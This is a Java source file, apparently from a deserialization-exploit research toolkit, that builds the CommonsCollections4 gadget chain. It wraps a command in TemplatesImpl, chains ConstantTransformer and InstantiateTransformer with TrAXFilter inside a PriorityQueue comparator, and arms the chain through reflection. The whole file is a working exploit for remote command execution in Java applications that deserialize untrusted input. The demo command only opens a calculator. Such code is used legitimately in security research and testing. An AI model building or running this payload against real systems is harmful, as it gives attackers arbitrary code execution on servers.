package com.p2hm1n.gadget;

import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.p2hm1n.annotation.Dependencies;
import com.p2hm1n.util.Gadgets;
import com.p2hm1n.util.PayloadRunner;
import com.p2hm1n.util.Reflections;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;



import javax.xml.transform.Templates;
import java.util.PriorityQueue;

/**
 * CommonsCollections4 的 gadget
 * 测试环境 JDK8u45
 *
 * Variation on CommonsCollections2 that uses InstantiateTransformer instead of
 * InvokerTransformer.
 */
public class CC4 {
    public static void main(String[] args) throws Exception{
        Object templates = Gadgets.createTemplatesImpl("open -a Calculator");

        org.apache.commons.collections4.functors.ConstantTransformer constant = new ConstantTransformer(String.class);

        // mock method name until armed
        Class[] paramTypes = new Class[] { String.class };
        Object[] objArgs = new Object[] { "foo" };
        org.apache.commons.collections4.functors.InstantiateTransformer instantiate = new InstantiateTransformer(
                paramTypes, objArgs);

        // grab defensively copied arrays
        paramTypes = (Class[]) Reflections.getFieldValue(instantiate, "iParamTypes");
        objArgs = (Object[]) Reflections.getFieldValue(instantiate, "iArgs");

        org.apache.commons.collections4.functors.ChainedTransformer chain = new ChainedTransformer(new Transformer[] { constant, instantiate });

        // create queue with numbers
        PriorityQueue<Object> queue = new PriorityQueue<Object>(2, new TransformingComparator(chain));
        queue.add(1);
        queue.add(1);

        // swap in values to arm
        Reflections.setFieldValue(constant, "iConstant", TrAXFilter.class);
        paramTypes[0] = Templates.class;
        objArgs[0] = templates;

        PayloadRunner.run(queue);

    }
}
